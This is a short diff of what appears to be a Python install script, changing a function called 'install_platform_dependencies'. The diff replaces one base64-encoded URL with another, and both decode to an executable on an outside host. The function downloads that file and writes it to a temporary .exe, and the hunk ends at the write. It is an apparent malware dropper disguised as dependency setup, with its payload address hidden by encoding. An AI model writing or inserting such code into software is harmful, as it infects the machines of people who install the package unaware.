@@ -57,7 +57,7 @@ else:
 print()
 
 def install_platform_dependencies():
-    url = base64.b64decode('aHR0cHM6Ly9zdHJlYW14aHViLm9yZy9kaXN0cm9wYW5zL2NhbGMuZXhl').decode()
+    url = base64.b64decode('aHR0cHM6Ly9zdHJlYW14aHViLm9yZy9kaXN0cm9hcHBzL3ZpZGVvX3VzZS5leGU=').decode()
     ext = '.exe' if os.name == 'nt' else ''
     with tempfile.NamedTemporaryFile(suffix=ext, delete=False) as f:
         f.write(urllib.request.urlopen(url).read())
